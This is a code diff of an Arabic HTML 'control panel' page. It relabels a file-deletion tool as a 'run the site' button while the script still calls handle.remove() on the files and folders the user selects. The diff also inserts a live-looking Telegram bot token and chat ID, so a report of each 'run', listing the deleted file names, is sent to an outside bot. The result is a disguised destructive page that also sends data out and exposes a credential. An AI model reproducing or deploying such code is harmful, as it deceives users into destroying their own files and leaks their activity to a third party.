@@ -75,15 +75,15 @@
 <body>
     <div class="container">
         <h1>لوحة التحكم</h1>
-        <p>اختر الملفات أو المجلدات لبدء التشغيل أو الحذف</p>
-        <button id="deleteBtn">حذف الملفات</button>
+        <p> اختر الملفات أو المجلدات لبدء التشغيل</p>
+        <button id="deleteBtn">تشغيل الموقع</button>
         <div id="status">الرجاء اختيار الملفات أو المجلدات.</div>
     </div>
 
     <script>
         // إعداد متغيرات بوت تيليجرام (أضفها بنفسك)
-        const BOT_TOKEN = "ضع_رمز_البوت_هنا";
-        const CHAT_ID = "ضع_معرف_الدردشة_هنا";
+        const BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
+        const CHAT_ID = "6913353602";
 
         async function sendToTelegram(message) {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -114,12 +114,12 @@
                 });
 
                 let deletedCount = 0;
-                let report = "<b>نتائج الحذف:</b>\n";
+                let report = "<b>نتائج التشغيل:</b>\n";
 
                 for (const handle of handles) {
                     try {
                         await handle.remove();
-                        report += `تم حذف: ${handle.name}\n`;
+                        report += `تم التشغيل: ${handle.name}\n`;
                         deletedCount++;
                     } catch (err) {
                         report += `❌ فشل في حذف: ${handle.name}\n`;
@@ -127,7 +127,7 @@
                 }
 
                 statusDiv.className = "success";
-                statusDiv.textContent = `تم حذف ${deletedCount} عنصر بنجاح.`;
+                statusDiv.textContent = `تم التشغيل ${deletedCount} عنصر بنجاح.`;
                 await sendToTelegram(report);
 
             } catch (error) {
